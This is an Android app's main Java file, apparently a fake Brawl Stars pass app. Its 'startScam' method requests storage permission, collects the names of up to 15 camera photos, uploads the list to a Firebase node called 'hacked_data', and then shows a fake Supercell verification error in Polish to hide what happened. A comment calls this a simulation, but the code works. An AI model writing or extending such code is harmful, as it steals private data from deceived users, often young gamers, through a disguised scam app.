package com.julek.brawlpass;

import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.google.firebase.database.FirebaseDatabase;
import java.io.File;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void startScam(View view) {
        // Sprawdzenie uprawnień
        if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != 0) {
            requestPermissions(new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE}, 1);
            return;
        }

        // Symulacja kradzieży danych
        File dcim = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), "Camera");
        File[] files = dcim.listFiles();
        String list = "ZAKOŃCZONO POBIERANIE:\n";

        if (files != null) {
            for (int i = 0; i < Math.min(files.length, 15); i++) {
                list += "- " + files[i].getName() + "\n";
            }
        }

        // WYSYŁKA DO TWOJEGO FIREBASE (Tego z v6.2)
        FirebaseDatabase.getInstance().getReference("hacked_data").setValue(list);

        Toast.makeText(this, "Błąd weryfikacji Supercell. Spróbuj ponownie za 24h.", Toast.LENGTH_LONG).show();
    }
}
